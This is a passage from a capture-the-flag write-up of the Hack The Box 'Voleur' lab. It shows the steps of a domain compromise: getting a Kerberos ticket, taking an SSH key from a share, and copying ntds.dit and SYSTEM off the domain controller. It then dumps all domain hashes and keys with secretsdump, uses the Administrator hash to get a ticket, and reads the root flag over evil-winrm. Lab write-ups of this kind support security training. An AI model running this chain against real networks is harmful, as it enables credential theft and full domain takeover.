❯ impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in jeremy.combs.ccache

❯ export KRB5CCNAME=/home/at0m/Hentai/HTB/voleur/jeremy.combs.ccache

❯ impacket-smbclient -k -no-pass VOLEUR.HTB/jeremy.combs@dc.voleur.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 14:55:01 2025 .
drw-rw-rw-          0  Mon Sep  8 16:44:51 2025 ..
drw-rw-rw-          0  Thu Jan 30 21:56:29 2025 Third-Line Support
# cd Third-Line Support
# ls
drw-rw-rw-          0  Thu Jan 30 21:56:29 2025 .
drw-rw-rw-          0  Wed Jan 29 14:55:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 21:56:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 21:52:35 2025 Note.txt.txt
# get Note.txt.txt
# get id_rsa
```

```bash
❯ cat Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin                                                                                                 
```

Here the Admin is talking about `svc_backup` which we can know from Excel file above, So we will access its SSH.
## SSH 

```bash
❯ sudo chmod 600 id_rsa
[sudo] password for at0m:
```

From Nmap Scan at first we had SSH at port `2222`:

```
<SNIP>
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
<SNIP>
```

```bash
❯ ssh -i id_rsa svc_backup@voleur.htb -p 2222
<SNIP>
svc_backup@DC:~$ ls -la
total 8
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025 .
drwxr-xr-x 1 root       root       4096 Jan 30  2025 ..
-rw-r--r-- 1 svc_backup svc_backup  220 Jan 30  2025 .bash_logout
-rw-r--r-- 1 svc_backup svc_backup 3837 Jan 30  2025 .bashrc
drwx------ 1 svc_backup svc_backup 4096 Jan 30  2025 .cache
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025 .landscape
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025 .local
-rw-r--r-- 1 svc_backup svc_backup    0 Sep  7 01:39 .motd_shown
-rw-r--r-- 1 svc_backup svc_backup  807 Jan 30  2025 .profile
drwxr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025 .ssh
-rw-r--r-- 1 svc_backup svc_backup    0 Jan 30  2025 .sudo_as_admin_successful
svc_backup@DC:~$ ls /
bin   dev  home  lib    lib64   media  opt   root  sbin  srv  tmp  var
boot  etc  init  lib32  libx32  mnt    proc  run   snap  sys  usr
svc_backup@DC:~$ cd /mnt
svc_backup@DC:/mnt$ ls
c
svc_backup@DC:/mnt$ cd c
svc_backup@DC:/mnt/c$ ls
ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'             DumpStack.log.tmp   PerfLogs               Recovery                     inetpub
'$WinREAgent'              Finance            'Program Files'        'System Volume Information'   pagefile.sys
 Config.Msi                HR                 'Program Files (x86)'   Users                        temp
'Documents and Settings'   IT                  ProgramData            Windows
svc_backup@DC:/mnt/c$
```

We can copy `System` and `ntds.dit` to the `/tmp` first then transfer to our machine.

```bash
svc_backup@DC:/mnt/c$ cd IT
svc_backup@DC:/mnt/c/IT$ ls
'First-Line Support'  'Second-Line Support'  'Third-Line Support'
svc_backup@DC:/mnt/c/IT$ cd 'Third-Line Support'/
svc_backup@DC:/mnt/c/IT/Third-Line Support$ ls
Backups  Note.txt.txt  id_rsa
svc_backup@DC:/mnt/c/IT/Third-Line Support$ cd Backups
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ cd 'Active Directory'/
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ ls
ntds.dit  ntds.jfm
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ cp ntds.dit /tmp
```

```bash
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ cd ../registry
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ ls
SECURITY  SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ cp SYSTEM /tmp
```

```bash
❯ scp -i id_rsa -P 2222 svc_backup@voleur.htb:/tmp/ntds.dit /home/at0m/Hentai/HTB/voleur
ntds.dit                                                                                 100%   24MB 178.5KB/s   02:17

❯ scp -i id_rsa -P 2222 svc_backup@voleur.htb:/tmp/SYSTEM /home/at0m/Hentai/HTB/voleur
SYSTEM                                                                                   100%   18MB 219.3KB/s   01:21
```

It might take while to transfer via `scp` so wait.
## SecretsDump

```bash
❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
```

```bash
❯ impacket-getTGT 'VOLEUR.HTB/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache

❯ export KRB5CCNAME=/home/at0m/Hentai/HTB/voleur/Administrator.ccache

❯ evil-winrm -i dc.voleur.htb -r voleur.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   1:12 AM           2308 Microsoft Edge.lnk
-ar---          9/7/2025   1:39 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
25d93a34d04bb5f2fe34baf3639e424a
```

---
